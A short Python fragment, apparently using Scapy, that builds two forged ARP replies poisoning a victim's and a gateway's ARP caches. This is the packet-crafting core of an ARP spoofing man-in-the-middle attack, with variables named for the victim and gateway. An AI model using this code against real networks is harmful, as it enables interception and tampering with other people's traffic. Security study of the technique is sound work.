fauxARP = ARP()
fauxARP.op = 2
fauxARP.psrc = self.IpGw
fauxARP.pdst = self.IpVictim
fauxARP.hwdst = self.MacVictim

fauxARPGW = ARP()
fauxARPGW.op=2
fauxARPGW.psrc= self.IpVictim
fauxARPGW.pdst= self.IpGw
fauxARPGW.hwdst= self.MacGw
